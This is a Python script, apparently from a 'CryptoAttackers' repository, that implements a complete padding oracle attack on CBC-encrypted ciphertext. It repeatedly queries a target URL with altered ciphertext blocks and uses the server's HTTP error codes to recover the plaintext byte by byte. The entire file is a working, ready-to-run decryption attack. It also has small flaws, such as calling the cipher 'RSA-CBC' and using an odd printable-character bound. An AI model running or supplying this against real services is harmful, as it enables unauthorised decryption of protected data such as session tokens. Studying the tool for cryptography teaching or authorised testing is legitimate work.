### PaddingOracleAttacker.py 
### MIT License 
### Copyright (c) 2017 636F57@GitHub 
### See more detail at https://github.com/636F57/CryptoAttackers/blob/master/LICENSE 

import urllib.request
import urllib.error
import sys
import binascii
import copy

bAllExausive = False  

blocksize = 16

def tryQuery(baseURL, ciphertext, successResponseCode):
	url = baseURL + str(ciphertext,'utf-8')
	try:
		res = urllib.request.urlopen(url)  
		print(res)
		return True
	except urllib.error.HTTPError as e:          
		if e.code == successResponseCode:
			return True
		else:
			return False

def createCiphertext(cipherlist):
	ciphertext = []
	for cipher in cipherlist:
		ciphertext += cipher
	ciphertext = binascii.hexlify(bytes(ciphertext))
	return ciphertext

def listXor(list1, list2):
	minlen = min(len(list1), len(list2))
	newlist = []
	for i in range(minlen):
		newlist.append(list1[i] ^ list2[i])
	return newlist

def isPrintable(x):
	if x < 0x20 or x > 0x79:
		return False
	else:
		return True

if __name__ == "__main__":
	
	baseURL = input("Enter URL which will be followed by ciphertexts:\n")
	cipher = input("Enter the ciphertext (hex-coded):\n")
	SuccessCode = int(input("Enter the HTTP error code number which the server returns when it detects invalid padding.(ex. 404 etc):\n"))

	ciphertext = binascii.unhexlify(cipher)
	cipherlist = []
	plainlist = []
	for i in range(0, len(ciphertext), blocksize):
		cipherlist.append(bytearray(ciphertext[i:i+blocksize]))
		plainlist.append([0]*blocksize)
	iv = cipherlist[0]

	if len(cipherlist) < 2 or len(cipherlist[-1])!= blocksize:
		print("Ciphertext is not correct length for RSA-CBC encrypted string.")
		sys.exit()
	
	print("starting attack...")
	padding = 0x00
	if bAllExausive == False:
		print("trying to find the correct padding")
		# find out the padding number
		tmpcipherlist = copy.deepcopy(cipherlist)
		lastbyte = cipherlist[-2][-1]
		for i in range(2,blocksize+1):  # try padding number 2-16(blocksize). not try 1 because it doesnt work as a test(always true).
			tmpcipherlist[-2][-1] = lastbyte ^ i ^ 1
			if tryQuery(baseURL, createCiphertext(tmpcipherlist), SuccessCode) :
				padding = i
				print("Padding found:", i)
				break
		else:
			print("Could not find the correct padding.")
			sys.exit()

		# apply padding to the plainlist
		for j in range(blocksize-padding, blocksize):
			plainlist[-1][j] = padding

	# find out the rest of ciphertexts
	bfirst = True
	for i in reversed(range(1, len(cipherlist))):	
		tmpcipherlist = copy.deepcopy(cipherlist[:i+1])
		for j in reversed(range(blocksize)):
			if bAllExausive == False:
				if bfirst:                 # skip padding bytes
					if j == blocksize - padding -1:
						bfirst = False
					else:
						continue
			print("trying ",j, "/16 byte of",i, "/"+str(len(cipherlist)-1)+" block")
			for c in range(0xFF+1):
				if bAllExausive == True:
					if bfirst:             # skip c=0 and 1
						if c == 2:
							bfirst = False
						else:
							continue
			# create query ciphertext
				plainlist[i][j] = c
				tmpcipherlist[-2] = listXor(cipherlist[i-1], plainlist[i]) # apply plaintext found so far and a current guess	
				for k in range(j, blocksize):  # apply fake padding number
					tmpcipherlist[-2][k] = tmpcipherlist[-2][k] ^ (blocksize - j) 
				# try query
				if tryQuery(baseURL, createCiphertext(tmpcipherlist), SuccessCode) :
					print("Plain byte found:", hex(c))
					break
			else:
				print("Could not find the correct plain byte.")
				print("plaintext=", plainlist)
				sys.exit()	

	plaintext = []
	for i in range(1,len(plainlist)):
		plaintext += plainlist[i]
	strPlaintext = "".join([chr(x) if isPrintable(x) else hex(x) for x in plaintext])
	print("plaintext is :" + strPlaintext)
	print("done")

